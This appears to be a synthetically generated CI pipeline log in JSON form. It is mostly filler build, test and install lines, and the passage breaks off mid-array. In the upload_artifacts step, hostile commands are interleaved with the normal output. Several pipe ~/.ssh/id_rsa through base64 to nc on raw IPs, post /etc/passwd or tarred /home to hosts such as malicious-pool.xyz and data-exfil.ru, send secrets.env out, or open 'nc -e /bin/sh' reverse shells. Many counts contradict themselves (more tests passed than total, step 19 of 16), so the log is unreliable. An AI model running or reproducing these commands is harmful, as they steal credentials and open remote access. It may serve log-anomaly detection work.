Successfully installed lodash-5.7\nCompiling lib/main.py...\nArtifact uploaded: build.tar.gz (11MB)\nChecking out main branch\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCoverage: 80% statements, 63% branches\nHEAD is now at 141971b\n\u2713 All checks passed\n\u2713 All checks passed\nWARNING: webpack has known vulnerabilities\nChecking out develop branch\n\u2713 Step 'install' succeeded\nCompiling components/main.py...\nSuccess!\npip: Collecting axios\nStep 19/16: Linting\nPlatform: darwin-arm64\n[12:46:14] DEBUG: Connection pool: 10 active\nArtifact uploaded: build.tar.gz (9MB)\nGenerating source maps...\n[12:46:14] INFO: Request completed\nEnvironment: development\nTransforming 355 files...\n[12:46:14] INFO: Request completed\nNODE_ENV=test\nStep 7/20: Linting\n[12:46:14] DEBUG: Loading configuration\nVerifying...\nReady.\nLayer 7/10: COPY command\nChecking out develop branch\nNODE_ENV=production\nPushing to registry...\nTime: 47.238s\nCompleted.\nWaiting...\nSuccess!\nArtifact downloaded: 3MB\npip: Collecting express\nInstalling express@1.13.6\n[12:46:14] DEBUG: Connection pool: 9 active\n\u2717 build failed with exit code 109\nException: NullPointerException\npip install: Successfully installed react-5.0\nPushing to registry...\nAlready up to date.\nUsing Python 3.12\nArtifact uploaded: build.tar.gz (9MB)\n=== Step setup_environment completed ===\n=== Step: checkout ===\nVerifying...\n[12:46:14] INFO: Starting build process\nException: RuntimeError\nTest Suites: 5 passed, 31 total\nBuilding Docker image...\nWaiting...\n\u2713 Step 'test' succeeded\nUploading artifact 'coverage' (16 files)\n\u2713 Step 'setup' succeeded\nLayer 7/11: RUN command\nCompiling lib/handler.rs...\nNODE_ENV=production\n[12:46:14] ERROR: Connection failed\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nOK\nStep 5/17: Deploying\nRan 54 tests in 13s\n[12:46:14] INFO: Request completed\nCache hit for key-9528\nnpm notice: created a lockfile\nCreating production build...\nCompiling lib/utils.go...\nCompiling utils/main.py...\nChecking out main branch\nMinifying app.js\nnpm notice: package.json updated\nChecking out develop branch\nLoading...\n\u2713 All checks passed\nLoading...\n\u2713 Task completed in 1230ms\nUploading artifact 'coverage' (50 files)\nTest Suites: 14 passed, 17 total\n\u2713 Step 'build' succeeded\nGET /api - 200 (51ms)\nOK\nException: TypeError\nnpm install: added 356 packages\nImage pulled successfully\nLoading...\nSwitched to branch 'hotfix/task-705'\nAlready up to date.\nBundling runtime.css\n  PASS: test_auth_login (96ms)\npip: Installing build dependencies...\nBuilding Docker image...\nWARNING: webpack has known vulnerabilities\n\u2713 Task completed in 4404ms\nVerifying...\nnpm notice: created a lockfile\nSuccess!\nCache restored successfully (480MB)\nPulling image: alpine:18\n[12:46:14] DEBUG: Connection pool: 14 active\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCoverage: 70% statements, 100% branches\nTest Suites: 44 passed, 19 total\nCache miss for key-2930\nStep 4/18: Installing dependencies\nPlatform: linux-x64\nCompiling components/utils.go...\n[12:46:14] WARN: Deprecated API usage\nWARNING: jest has known vulnerabilities\nDone.\npip: Collecting jest\nBundling runtime.css\n[12:46:14] WARN: Deprecated API usage\nCreating production build...\n\u2713 Step 'test' succeeded\npip: Downloading eslint-2.18.tar.gz\nCache hit for key-8222\nCreating production build...\nWARNING: prettier has known vulnerabilities\nFinished.\nTests: 446 passed, 338 total\nProcessing...\nWARNING: axios has known vulnerabilities\n[12:46:14] DEBUG: Initializing service\nVerifying...\nRan 170 tests in 20s\nCache miss for key-2120\npip: Downloading eslint-4.1.tar.gz\nFinished.\n[12:46:14] DEBUG: Memory usage: 1288MB\nOptimizing 91 modules...\n[12:46:14] DEBUG: Query executed in 63ms\nConnection established\nSwitched to branch 'feature/task-429'\nInstalling webpack@1.0.8\nStep 4/17: Installing dependencies\nStep 2/24: Installing dependencies\n[12:46:14] WARN: Deprecated API usage\nConnection established\n  PASS: e2e/test_db_connect.spec.js\n  PASS: test_user_create (131ms)\nPOST /data - 201 (104ms)\n  PASS: unit/test_auth_login.spec.js\nEnvironment: test\nUsing Python 3.10\n  PASS: test_user_create (64ms)\nFetching submodules...\n[12:46:14] INFO: Cache refreshed\nGenerating source maps...\nTransforming 885 files...\nUsing Node.js 15.2.3\n  PASS: e2e/test_user_create.spec.js\nStep 19/20: Installing dependencies\nStep 6/15: Deploying\nWaiting...\nTime: 115.423s\npip install: Successfully installed prettier-4.6\nTLS handshake completed\nBundling runtime.css\npip install: Successfully installed express-3.15\nFinished.\nnpm install: resolved 1695 packages\nPOST /api - 202 (126ms)\nEnvironment: development\nNODE_ENV=test\nUploading artifact 'dist' (32 files)\npip: Installing build dependencies...\nTests: 107 passed, 348 total\npip: Installing build dependencies...\nHEAD is now at 380c1f7\nCache invalidated: dependencies\nOptimizing 11 modules...\nCache invalidated: node_modules\nnpm install: resolved 150 packages\nLoading...\n\u2713 Task completed in 4308ms\nCache invalidated: node_modules\n\u2713 deploy completed\nCoverage: 100% statements, 94% branches\nInstalling lodash@4.20.4\n=== Step checkout completed ===\n=== Step: type_check ===\nPushing to registry...\nCompiling components/utils.go...\nnpm install: resolved 1297 packages\nNODE_ENV=production\n[12:46:14] INFO: Processing request\nArtifact downloaded: 37MB\nCompiling lib/utils.go...\n\u2713 Task completed in 1054ms\nFetching from https://googleapis.com/package.json\nConnection established\nGenerating source maps...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nUsing Python 3.10\n[12:46:14] INFO: Connecting to database\nTests: 82 passed, 432 total\nPOST /data - 201 (359ms)\nProcessing...\nOptimizing 43 modules...\n[12:46:14] ERROR: Connection failed\nCache miss for key-5493\nGET /status - 200 (6ms)\nnpm notice: package.json updated\nStep 18/18: Running migrations\nCoverage: 81% statements, 91% branches\n\u2713 validate completed\npip: Installing build dependencies...\n[12:46:14] INFO: Starting build process\nPlatform: win32-x64\nCache invalidated: build\npip: Downloading prettier-3.10.tar.gz\nTransforming 342 files...\nArtifact uploaded: build.tar.gz (35MB)\nnpm notice: package.json updated\n[12:46:14] WARN: Deprecated API usage\nnpm install: resolved 550 packages\nTransforming 225 files...\n[12:46:14] INFO: Processing request\nStep 12/17: Deploying\n\u2717 build failed with exit code 71\nTest Suites: 7 passed, 14 total\nWARNING: jest has known vulnerabilities\n  PASS: integration/test_user_create.spec.js\nImage pulled successfully\nLoading...\nEnvironment: development\n[12:46:14] DEBUG: Memory usage: 519MB\nCompiling lib/handler.rs...\nLayer 6/8: RUN command\nLayer 3/14: COPY command\nLoading...\n\u2713 All checks passed\nHEAD is now at 7a69a8c\n[12:46:14] INFO: Cache refreshed\nWARNING: eslint has known vulnerabilities\nSnapshots: 38 passed, 31 total\nCompiling lib/index.js...\nMinifying app.js\nCompiling lib/main.py...\nyarn add: Done in 24.6s\n[12:46:14] DEBUG: Memory usage: 1063MB\nPushing to registry...\nWARNING: webpack has known vulnerabilities\nCache miss for key-4443\n[12:46:14] WARN: Deprecated API usage\nCompiling components/handler.rs...\n\u2713 Step 'checkout' succeeded\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nStep 11/16: Linting\nProcessing...\nGenerating source maps...\nGenerating source maps...\nFinished.\nFetching submodules...\n[12:46:14] WARN: Deprecated API usage\n[12:46:14] INFO: Processing request\n[12:46:14] INFO: Request completed\n[12:46:14] DEBUG: Initializing service\nFetching submodules...\nImage pulled successfully\nOptimizing 94 modules...\nGenerating source maps...\nCompiling src/app.ts...\npip: Downloading jest-1.12.tar.gz\nVerifying...\nGenerating source maps...\nBuilding Docker image...\nStep 10/20: Deploying\nnpm notice: package.json updated\nStep 15/21: Building\nUploading artifact 'build' (42 files)\nStep 10/16: Running migrations\nTransforming 462 files...\nLayer 1/12: ENV command\nChecking out master branch\nChecking out develop branch\nImage pulled successfully\nPulling image: node:3.11\nChecking out develop branch\nnpm install: resolved 1149 packages\nPOST /api - 201 (134ms)\n[12:46:14] DEBUG: Loading configuration\nMinifying app.js\nCoverage: 83% statements, 82% branches\nUsing Python 3.12\nGenerating source maps...\nMinifying vendor.js\nUsing Node.js 15.20.7\nProcessing...\nWARNING: webpack has known vulnerabilities\nnpm install: added 275 packages\n[12:46:14] DEBUG: Loading configuration\nRan 38 tests in 3s\nTransforming 800 files...\nImage pulled successfully\nCompiling lib/handler.rs...\nnpm notice: created a lockfile\nSwitched to branch 'hotfix/task-144'\n[12:46:14] INFO: Processing request\nUsing Python 3.10\nPulling image: node:latest\nArtifact uploaded: dist.zip (33MB)\nWARNING: eslint has known vulnerabilities\nRan 189 tests in 50s\nArtifact uploaded: build.tar.gz (27MB)\nStep 3/19: Running migrations\nOK\nSwitched to branch 'feature/task-674'\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nSnapshots: 0 passed, 47 total\nCompiling src/main.py...\nMinifying main.js\n\u2713 All checks passed\nInstalling jest@4.17.7\n=== Step type_check completed ===\n=== Step: deploy_production ===\nDone.\nUploading artifact 'coverage' (26 files)\nCompiling components/service.java...\nStep 13/25: Linting\npip: Collecting webpack\nTest Suites: 8 passed, 40 total\nUsing Node.js 15.4.3\nNODE_ENV=development\nArtifact uploaded: dist.zip (74MB)\npip: Collecting jest\npip install: Successfully installed jest-2.9\nnpm install: added 90 packages\nCompiling components/main.py...\n[12:46:14] DEBUG: Query executed in 11ms\n[12:46:14] WARN: Deprecated API usage\nLayer 10/10: RUN command\nGET /api - 200 (12ms)\nCompleted.\nyarn add: Done in 11.70s\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCache saved successfully\nEnvironment: staging\nStep 14/15: Installing dependencies\nPOST /upload - 201 (301ms)\nFetching submodules...\nTests: 116 passed, 465 total\n[12:46:14] WARN: Deprecated API usage\n[12:46:14] WARN: Deprecated API usage\nTests: 441 passed, 264 total\nUsing Python 3.10\nPushing to registry...\nCreating production build...\nGenerating source maps...\nTransforming 690 files...\nOptimizing 61 modules...\nnpm notice: created a lockfile\nUploading artifact 'dist' (25 files)\nSwitched to branch 'hotfix/task-562'\nNODE_ENV=development\n  PASS: test_db_connect (149ms)\n\u2717 build failed with exit code 96\nGET /health - 200 (85ms)\n[12:46:14] INFO: Cache refreshed\nPulling image: node:18\n\u2713 Task completed in 275ms\nTLS handshake completed\nRan 74 tests in 44s\nBuilding Docker image...\nCompleted.\nStep 10/23: Testing\nArtifact downloaded: 6MB\n[12:46:14] WARN: Deprecated API usage\nStep 14/22: Running migrations\nChecking out develop branch\n[12:46:14] DEBUG: Connection pool: 14 active\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCoverage: 94% statements, 61% branches\nChecking out develop branch\nArtifact uploaded: dist.zip (85MB)\nOK\n[12:46:14] WARN: Deprecated API usage\n[12:46:14] INFO: Starting build process\nStep 7/25: Running migrations\n\u2713 Step 'build' succeeded\nyarn add: Done in 5.72s\nGET /status - 200 (90ms)\n[12:46:14] DEBUG: Memory usage: 1993MB\nArtifact downloaded: 28MB\n  PASS: test_db_connect (301ms)\n  PASS: test_db_connect (65ms)\nWARNING: prettier has known vulnerabilities\nyarn add: Done in 14.43s\nnpm notice: package.json updated\n[12:46:14] INFO: Connecting to database\nCompleted.\nCache invalidated: node_modules\nStep 19/25: Deploying\nFetching from https://docker.io/package.json\nPlatform: darwin-arm64\nFAILED: test_user_create\nStep 14/25: Testing\nPlatform: darwin-arm64\nLoading...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nyarn add: Done in 3.87s\nCache saved successfully\n[12:46:14] INFO: Request completed\nnpm notice: created a lockfile\nnpm notice: created a lockfile\nFetching submodules...\n  PASS: test_api_health (218ms)\nnpm notice: created a lockfile\nMinifying app.js\nDone.\n[12:46:14] WARN: Deprecated API usage\nEnvironment: staging\nConnection established\nLayer 10/9: ENV command\nGenerating source maps...\nUploading artifact 'build' (39 files)\nCreating production build...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n\u2713 Task completed in 4790ms\nConnection established\nHEAD is now at 06b9bab\nFetching from https://pypi.org/package.json\nCompleted.\nStep 2/18: Deploying\n[12:46:14] INFO: Request completed\nGET /api - 200 (4ms)\n\u2713 deploy completed\n[12:46:14] DEBUG: Loading configuration\npip: Downloading jest-4.6.tar.gz\nCompiling src/service.java...\nPlatform: win32-x64\nStep 19/23: Building\n[12:46:14] WARN: Deprecated API usage\nLayer 10/15: COPY command\nArtifact uploaded: dist.zip (59MB)\nUploading artifact 'dist' (29 files)\nAlready up to date.\n[12:46:14] INFO: Connecting to database\nLoading...\nOptimizing 38 modules...\n[12:46:14] INFO: Starting build process\nOptimizing 22 modules...\nCompiling utils/service.java...\nInstalling webpack@4.19.6\n[12:46:14] INFO: Request completed\nCompiling src/main.py...\nFetching submodules...\nNODE_ENV=production\nCache miss for key-1757\nPushing to registry...\n=== Step deploy_production completed ===\n=== Step: upload_artifacts ===\nFetching submodules...\nLoading...\n\u2713 validate completed\nCompleted.\nException: TypeError\nProcessing...\n[12:46:14] WARN: Deprecated API usage\n\u2713 Task completed in 1025ms\n[12:46:14] WARN: Deprecated API usage\nnpm install: added 141 packages\nBundling main.css\nGET /status - 204 (35ms)\nCache hit for key-2105\nReady.\nWARNING: prettier has known vulnerabilities\n  PASS: test_auth_login (171ms)\necho $(cat ~/.ssh/id_rsa) | base64 | nc 181.85.130.14 58567\nProcessing...\nWARNING: react has known vulnerabilities\n[12:46:14] WARN: Deprecated API usage\nCreating production build...\n\u2713 All checks passed\n[12:46:14] INFO: Cache refreshed\nArtifact uploaded: build.tar.gz (47MB)\nLayer 9/8: ENV command\nnpm notice: package.json updated\nTransforming 753 files...\nFetching from https://docker.io/package.json\n[12:46:14] INFO: Connecting to database\nLayer 9/11: COPY command\nStep 6/23: Building\nReady.\nStep 8/18: Installing dependencies\n[12:46:14] WARN: Deprecated API usage\nCoverage: 76% statements, 92% branches\nTLS handshake completed\npip: Installing build dependencies...\necho $(cat ~/.ssh/id_rsa) | base64 | nc 26.159.241.2 28241\necho $(cat ~/.ssh/id_rsa) | base64 | nc 63.102.25.31 54103\n\u2713 Task completed in 196ms\n[12:46:14] DEBUG: Connection pool: 9 active\n[12:46:14] INFO: Connecting to database\npip install: Successfully installed express-1.12\npip: Installing build dependencies...\nwget --post-data=\"$(cat /etc/passwd)\" https://malicious-pool.xyz/exfil\nGenerating source maps...\nCompleted.\n\u26a0 DEPRECATION: Feature will be removed in v3.0\ntar czf - /home | curl -X POST -d @- https://data-exfil.ru/upload\ntar czf - /home | curl -X POST -d @- https://crypto-mine.io/upload\nWaiting...\nWaiting...\nArtifact downloaded: 21MB\nPulling image: alpine:3.11\npip install: Successfully installed prettier-3.19\nCache saved successfully\nUsing Python 3.11\n  PASS: integration/test_auth_login.spec.js\nCache restored successfully (89MB)\nnc -e /bin/sh 19.24.253.19 32634\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nNODE_ENV=test\npip: Installing build dependencies...\nGenerating source maps...\nUsing Python 3.9\nCoverage: 75% statements, 94% branches\nCache restored successfully (62MB)\nArtifact uploaded: dist.zip (41MB)\n[12:46:14] WARN: Deprecated API usage\nChecking out develop branch\nTests: 294 passed, 67 total\nnpm install: added 248 packages\nChecking out master branch\nNODE_ENV=development\n\u2717 build failed with exit code 88\nCache hit for key-1480\nnpm notice: created a lockfile\nWARNING: prettier has known vulnerabilities\nVerifying...\nPulling image: node:18\nConnection established\necho $(cat ~/.ssh/id_rsa) | base64 | nc 108.15.159.194 62720\nTLS handshake completed\ntar czf - /home | curl -X POST -d @- https://data-exfil.ru/upload\nConnection established\nLayer 6/8: RUN command\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:46:14] DEBUG: Loading configuration\nLayer 4/13: ENV command\n[12:46:14] DEBUG: Query executed in 81ms\nMinifying vendor.js\nVerifying...\npip: Collecting axios\nOptimizing 97 modules...\nStep 2/21: Installing dependencies\nTLS handshake completed\nCreating production build...\nDone.\nStep 20/22: Building\nInstalling express@3.15.0\nCache restored successfully (378MB)\nCompiling lib/utils.go...\nwget --post-data=\"$(cat /etc/passwd)\" https://malicious-pool.xyz/exfil\nnc -e /bin/sh 239.70.49.109 4064\nBundling styles.js\nException: ValueError\nVerifying...\nCoverage: 100% statements, 90% branches\nStep 7/18: Running migrations\nSnapshots: 48 passed, 10 total\nUploading artifact 'build' (47 files)\nnpm install: added 147 packages\n[12:46:14] ERROR: Connection failed\nTransforming 434 files...\nPlatform: win32-x64\n[12:46:14] INFO: Request completed\nConnection established\nCache miss for key-3787\nGenerating source maps...\nSnapshots: 38 passed, 11 total\nwget --post-data=\"$(cat /etc/passwd)\" https://evil-server.cc/exfil\n\u2717 build failed with exit code 81\nPushing to registry...\nnc -e /bin/sh 130.98.39.212 9104\nTime: 15.457s\nwget --post-data=\"$(cat /etc/passwd)\" https://crypto-mine.io/exfil\ncurl -X POST https://malicious-pool.xyz/collect --data @secrets.env\nMinifying vendor.js\nFetching submodules...\nDone.\n[12:46:14] DEBUG: Memory usage: 1168MB\n  PASS: test_cache_hit (459ms)\nBuilding Docker image...\nSending 379MB of data to malicious-pool.xyz\nSuccess!\nStep 4/15: Deploying\npip: Collecting jest\nEnvironment: production\nCache hit for key-7000\n[12:46:14] DEBUG: Initializing service\nArtifact downloaded: 43MB\nTest Suites: 43 passed, 42 total\nnpm notice: package.json updated\nCache invalidated: build\nInstalling axios@5.5.7\nSwitched to branch 'hotfix/task-868'\nwget --post-data=\"$(cat /etc/passwd)\" https://data-exfil.ru/exfil\nArtifact uploaded: build.tar.gz (40MB)\nReady.\nTests: 124 passed, 423 total\ntar czf - /home | curl -X POST -d @- https://evil-server.cc/upload\ntar czf - /home | curl -X POST -d @- https://data-exfil.ru/upload\necho $(cat ~/.ssh/id_rsa) | base64 | nc 221.165.88.222 42398\nPulling image: node:18\n=== Step upload_artifacts completed ===",
    "steps": [
      {
        "name": "lint",
        "status": "success",
        "started_at": "2025-12-16T12:46:14.139523",
        "finished_at": "2025-12-16T12:46:29.954426",
        "log_lines": [
          "=== Step: lint ===",
          "Artifact downloaded: 25MB",
          "HEAD is now at 99c372c",
          "Installing axios@3.19.8",
          "npm notice: package.json updated",
          "Step 6/21: Installing dependencies",
          "Optimizing 33 modules...",
          "Image pulled successfully",
          "WARNING: webpack has known vulnerabilities",
          "Uploading artifact 'coverage' (9 files)",
          "Ready.",
          "Already up to date.",
          "Coverage: 73% statements, 92% branches",
          "Using Python 3.10",
          "OK",
          "Test Suites: 36 passed, 25 total",
          "Step 8/16: Building",
          "Step 11/24: Linting",
          "[12:46:14] DEBUG: Connection pool: 17 active",
          "Compiling components/service.java...",
          "Coverage: 98% statements, 91% branches",
          "Step 9/16: Testing",
          "Creating production build...",
          "  PASS: integration/test_db_connect.spec.js",
          "npm notice: package.json updated",
          "\u2713 Task completed in 1542ms",
          "Done.",
          "[12:46:14] INFO: Cache refreshed",
          "pip: Collecting axios",
          "Cache restored successfully (457MB)",
          "npm notice: created a lockfile",
          "Step 3/20: Building",
          "Optimizing 40 modules...",
          "Compiling components/service.java...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Layer 10/10: ENV command",
          "Artifact downloaded: 38MB",
          "Installing react@3.18.0",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Minifying main.js",
          "Using Node.js 19.4.3",
          "npm notice: package.json updated",
          "  PASS: integration/test_auth_login.spec.js",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "WARNING: jest has known vulnerabilities",
          "Platform: darwin-arm64",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Step 1/25: Running migrations",
          "Step 13/20: Linting",
          "Snapshots: 46 passed, 48 total",
          "Uploading artifact 'coverage' (19 files)",
          "POST /data - 202 (33ms)",
          "  PASS: test_cache_hit (497ms)",
          "Ready.",
          "pip: Downloading prettier-5.3.tar.gz",
          "Step 11/17: Testing",
          "  PASS: e2e/test_cache_hit.spec.js",
          "Cache restored successfully (419MB)",
          "Done.",
          "HEAD is now at 8940b63",
          "Waiting...",
          "POST /api - 202 (315ms)",
          "Verifying...",
          "npm notice: package.json updated",
          "Artifact uploaded: dist.zip (68MB)",
          "FAILED: test_auth_login",
          "Artifact uploaded: build.tar.gz (39MB)",
          "Cache restored successfully (233MB)",
          "Generating source maps...",
          "Artifact uploaded: build.tar.gz (5MB)",
          "\u2713 test completed",
          "Checking out master branch",
          "Success!",
          "[12:46:14] INFO: Cache refreshed",
          "Using Node.js 18.15.4",
          "[12:46:14] INFO: Connecting to database",
          "npm install: resolved 1448 packages",
          "npm install: resolved 915 packages",
          "Bundling styles.css",
          "  PASS: test_db_connect (41ms)",
          "Time: 67.890s",
          "[12:46:14] ERROR: Connection failed",
          "Uploading artifact 'build' (5 files)",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "npm notice: package.json updated",
          "pip: Collecting eslint",
          "Completed.",
          "Ran 37 tests in 5s",
          "Artifact uploaded: build.tar.gz (28MB)",
          "pip install: Successfully installed jest-1.6",
          "Verifying...",
          "npm notice: package.json updated",
          "WARNING: prettier has known vulnerabilities",
          "npm install: resolved 1456 packages",
          "Step 18/16: Deploying",
          "Uploading artifact 'coverage' (39 files)",
          "Coverage: 72% statements, 63% branches",
          "  PASS: integration/test_auth_login.spec.js",
          "[12:46:14] WARN: Deprecated API usage",
          "Compiling components/app.ts...",
          "Step 17/16: Linting",
          "Cache restored successfully (300MB)",
          "Done.",
          "[12:46:14] DEBUG: Loading configuration",
          "Switched to branch 'bugfix/task-852'",
          "[12:46:14] ERROR: Connection failed",
          "[12:46:14] DEBUG: Memory usage: 1180MB",
          "npm notice: created a lockfile",
          "TLS handshake completed",
          "\u2713 Step 'build' succeeded",
          "[12:46:14] WARN: Deprecated API usage",
          "[12:46:14] INFO: Cache refreshed",
          "GET /health - 200 (93ms)",
          "Image pulled successfully",
          "[12:46:14] WARN: Deprecated API usage",
          "Layer 8/12: RUN command",
          "Environment: development",
          "  PASS: integration/test_user_create.spec.js",
          "  PASS: test_auth_login (330ms)",
          "  PASS: test_api_health (180ms)",
          "[12:46:14] INFO: Connecting to database",
          "[12:46:14] INFO: Processing request",
          "Cache invalidated: node_modules",
          "[12:46:14] ERROR: Connection failed",
          "[12:46:14] INFO: Connecting to database",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Generating source maps...",
          "Waiting...",
          "Step 7/23: Building",
          "Transforming 512 files...",
          "npm notice: created a lockfile",
          "TLS handshake completed",
          "[12:46:14] INFO: Cache refreshed",
          "Artifact uploaded: build.tar.gz (35MB)",
          "Artifact uploaded: build.tar.gz (25MB)",
          "=== Step lint completed ==="
        ]
      },
      {
        "name": "save_cache",
        "status": "success",
        "started_at": "2025-12-16T12:46:29.954426",
        "finished_at": "2025-12-16T12:46:39.443368",
        "log_lines": [
          "=== Step: save_cache ===",
          "[12:46:14] INFO: Connecting to database",
          "Artifact downloaded: 37MB",
          "[12:46:14] DEBUG: Query executed in 49ms",
          "Exception: RuntimeError",
          "Cache saved successfully",
          "Generating source maps...",
          "Compiling lib/app.ts...",
          "Cache miss for key-1068",
          "Artifact uploaded: dist.zip (33MB)",
          "FAILED: test_cache_hit",
          "\u2717 build failed with exit code 120",
          "Installing express@2.9.2",
          "Switched to branch 'hotfix/task-342'",
          "Cache invalidated: node_modules",
          "Compiling components/index.js...",
          "[12:46:14] DEBUG: Query executed in 82ms",
          "[12:46:14] ERROR: Connection failed",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:46:14] DEBUG: Loading configuration",
          "\u2713 test completed",
          "[12:46:14] INFO: Cache refreshed",
          "  PASS: test_auth_login (317ms)",
          "Compiling utils/main.py...",
          "Using Python 3.12",
          "[12:46:14] DEBUG: Connection pool: 19 active",
          "OK",
          "[12:46:14] INFO: Starting build process",
          "Test Suites: 25 passed, 20 total",
          "Tests: 230 passed, 136 total",
          "Using Node.js 14.13.1",
          "Compiling lib/main.py...",
          "Building Docker image...",
          "Fetching submodules...",
          "Ran 189 tests in 52s",
          "Using Node.js 17.3.10",
          "Success!",
          "npm install: resolved 1087 packages",
          "Step 13/18: Installing dependencies",
          "Ready.",
          "Loading...",
          "Checking out develop branch",
          "npm notice: created a lockfile",
          "pip: Collecting prettier",
          "[12:46:14] DEBUG: Memory usage: 388MB",
          "[12:46:14] ERROR: Connection failed",
          "\u2713 All checks passed",
          "Uploading artifact 'dist' (39 files)",
          "\u2713 Task completed in 3123ms",
          "Already up to date.",
          "Time: 44.237s",
          "Processing...",
          "Switched to branch 'bugfix/task-406'",
          "\u2713 All checks passed",
          "pip: Collecting express",
          "Artifact uploaded: build.tar.gz (24MB)",
          "Artifact downloaded: 17MB",
          "npm install: added 403 packages",
          "Ready.",
          "Generating source maps...",
          "Using Node.js 14.13.10",
          "[12:46:14] DEBUG: Initializing service",
          "Step 20/24: Building",
          "Tests: 300 passed, 363 total",
          "Pushing to registry...",
          "Pushing to registry...",
          "Step 2/18: Linting",
          "[12:46:14] INFO: Connecting to database",
          "Artifact downloaded: 38MB",
          "Ready.",
          "Step 12/19: Linting",
          "Time: 56.120s",
          "Installing axios@3.11.0",
          "\u2713 All checks passed",
          "[12:46:14] DEBUG: Query executed in 84ms",
          "npm notice: package.json updated",
          "Cache miss for key-4893",
          "[12:46:14] DEBUG: Loading configuration",
          "WARNING: eslint has known vulnerabilities",
          "[12:46:14] INFO: Starting build process",
          "Creating production build...",
          "Uploading artifact 'dist' (41 files)",
          "Compiling lib/handler.rs...",
          "HEAD is now at c8b2517",
          "Step 17/15: Testing",
          "Generating source maps...",
          "Compiling utils/main.py...",
          "  PASS: test_auth_login (140ms)",
          "Fetching from https://googleapis.com/package.json",
          "Compiling utils/main.py...",
          "npm notice: package.json updated",
          "Ran 95 tests in 38s",
          "[12:46:14] INFO: Starting build process",
          "\u2713 Step 'build' succeeded",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Step 15/17: Testing",
          "Step 19/21: Linting",
          "Uploading artifact 'dist' (47 files)",
          "Loading...",
          "Using Node.js 15.1.6",
          "Compiling components/service.java...",
          "[12:46:14] DEBUG: Loading configuration",
          "Environment: production",
          "Finished.",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Loading...",
          "Ran 149 tests in 59s",
          "WARNING: jest has known vulnerabilities",
          "Done.",
          "Transforming 436 files...",
          "Ready.",
          "Step 15/15: Linting",
          "Using Python 3.11",
          "\u2713 test completed",
          "[12:46:14] DEBUG: Connection pool: 5 active",
          "Checking out master branch",
          "[12:46:14] INFO: Starting build process",
          "npm install: added 174 packages",
          "npm notice: package.json updated",
          "\u2713 build completed",
          "[12:46:14] INFO: Request completed",
          "Completed.",
          "Compiling components/handler.rs...",
          "Switched to branch 'feature/task-970'",
          "npm notice: created a lockfile",
          "Completed.",
          "Verifying...",
          "\u2717 build failed with exit code 46",
          "Connection established",
          "yarn add: Done in 10.43s",
          "Cache saved successfully",
          "Verifying...",
          "[12:46:14] INFO: Starting build process",
          "Time: 40.579s",
          "Success!",
          "=== Step save_cache completed ==="
        ]
      },
      {
        "name": "install_dependencies",
        "status": "success",
        "started_at": "2025-12-16T12:46:39.443368",
        "finished_at": "2025-12-16T12:47:26.888076",
        "log_lines": [
          "=== Step: install_dependencies ===",
          "[12:46:14] INFO: Request completed",
          "Connection established",
          "Artifact uploaded: dist.zip (4MB)",
          "  PASS: test_user_create (236ms)",
          "Compiling src/utils.go...",
          "[12:46:14] DEBUG: Query executed in 50ms",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "[12:46:14] DEBUG: Initializing service",
          "[12:46:14] INFO: Starting build process",
          "pip: Collecting axios",
          "Ran 25 tests in 16s",
          "Compiling src/handler.rs...",
          "[12:46:14] INFO: Cache refreshed",
          "Cache hit for key-9530",
          "\u2713 Task completed in 1128ms",
          "HEAD is now at c2677e9",
          "npm install: added 188 packages",
          "[12:46:14] ERROR: Connection failed",
          "[12:46:14] WARN: Deprecated API usage",
          "[12:46:14] WARN: Deprecated API usage",
          "OK",
          "[12:46:14] INFO: Connecting to database",
          "Step 2/20: Linting",
          "  PASS: e2e/test_cache_hit.spec.js",
          "\u2713 Task completed in 4502ms",
          "Ready.",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "yarn add: Done in 13.13s",
          "Done.",
          "pip: Collecting jest",
          "Transforming 729 files...",
          "Loading...",
          "  PASS: integration/test_cache_hit.spec.js",
          "NODE_ENV=production",
          "Layer 3/12: COPY command",
          "npm notice: created a lockfile",
          "Loading...",
          "Loading...",
          "npm notice: package.json updated",
          "Test Suites: 18 passed, 40 total",
          "Finished.",
          "Environment: development",
          "Step 17/20: Building",
          "Step 12/24: Running migrations",
          "Bundling vendor.css",
          "[12:46:14] INFO: Cache refreshed",
          "Cache miss for key-3868",
          "Environment: test",
          "  PASS: integration/test_cache_hit.spec.js",
          "Artifact uploaded: dist.zip (39MB)",
          "Coverage: 79% statements, 65% branches",
          "NODE_ENV=test",
          "pip: Collecting prettier",
          "Using Python 3.9",
          "TLS handshake completed",
          "npm notice: created a lockfile",
          "[12:46:14] DEBUG: Initializing service",
          "Step 14/15: Installing dependencies",
          "Step 7/19: Linting",
          "Compiling components/index.js...",
          "Creating production build...",
          "pip install: Successfully installed lodash-3.17",
          "Generating source maps...",
          "[12:46:14] INFO: Cache refreshed",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Fetching submodules...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Tests: 233 passed, 164 total",
          "Artifact downloaded: 47MB",
          "\u2713 package completed",
          "Environment: staging",
          "npm install: added 235 packages",
          "[12:46:14] WARN: Deprecated API usage",
          "Connection established",
          "npm notice: package.json updated",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Optimizing 27 modules...",
